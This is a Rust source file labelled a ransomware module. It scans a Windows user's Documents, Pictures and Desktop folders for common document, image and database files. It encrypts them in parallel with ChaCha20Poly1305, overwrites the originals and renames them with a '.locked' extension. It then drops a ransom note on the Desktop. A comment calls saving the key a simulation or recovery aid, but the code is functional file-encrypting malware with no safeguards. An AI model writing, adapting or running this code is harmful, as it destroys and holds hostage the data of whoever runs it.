use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, AeadCore, XNonce};
use chacha20poly1305::aead::{Aead, OsRng};
use walkdir::WalkDir;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use rayon::prelude::*;

const EXTENSIONS: &[&str] = &[
    "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "png", "db", "sql"
];

fn main() {
    println!("[Ransomware Module] Started.");
    
    // 1. Generate Key
    let key = ChaCha20Poly1305::generate_key(&mut OsRng); // 32 bytes
    let cipher = ChaCha20Poly1305::new(&key);
    
    // Save Key for Simulation/Recovery
    let user_profile = std::env::var("USERPROFILE").unwrap_or(".".to_string());
    let key_path = format!("{}\\Desktop\\ransom.key", user_profile);
    if let Ok(mut key_file) = File::create(&key_path) {
        let _ = key_file.write_all(key.as_slice());
        println!("[Ransomware Module] Key saved to: {}", key_path);
    }
    let target_dirs = vec![
        format!("{}\\Documents", user_profile),
        format!("{}\\Pictures", user_profile),
        format!("{}\\Desktop", user_profile),
    ];
    
    println!("[Ransomware Module] Scanning Targets: {:?}", target_dirs);
    
    let mut files_to_encrypt = Vec::new();
    
    for dir in target_dirs {
        for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() {
                if let Some(ext) = path.extension() {
                    if let Some(s) = ext.to_str() {
                        if EXTENSIONS.contains(&s.to_lowercase().as_str()) {
                            files_to_encrypt.push(path.to_path_buf());
                        }
                    }
                }
            }
        }
    }
    
    println!("[Ransomware Module] Found {} target files.", files_to_encrypt.len());
    
    // 3. Encrypt (Parallel)
    files_to_encrypt.par_iter().for_each(|path| {
        if let Ok(mut file) = File::open(path) {
            let mut buffer = Vec::new();
            if file.read_to_end(&mut buffer).is_ok() {
                let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits
                if let Ok(ciphertext) = cipher.encrypt(&nonce, buffer.as_ref()) {
                    // Overwrite
                    if let Ok(mut out_file) = File::create(path) {
                        let _ = out_file.write_all(&nonce);
                        let _ = out_file.write_all(&ciphertext);
                        // Rename
                        let mut new_name = path.clone();
                        new_name.set_extension("locked");
                        let _ = fs::rename(path, new_name);
                    }
                }
            }
        }
    });

    println!("[Ransomware Module] Encryption Complete.");
    
    // 4. Drop Note
    let note_path = format!("{}\\Desktop\\READ_ME.txt", user_profile);
    let _ = fs::write(note_path, "YOUR FILES ARE ENCRYPTED. CONTACT ADMIN.");
}
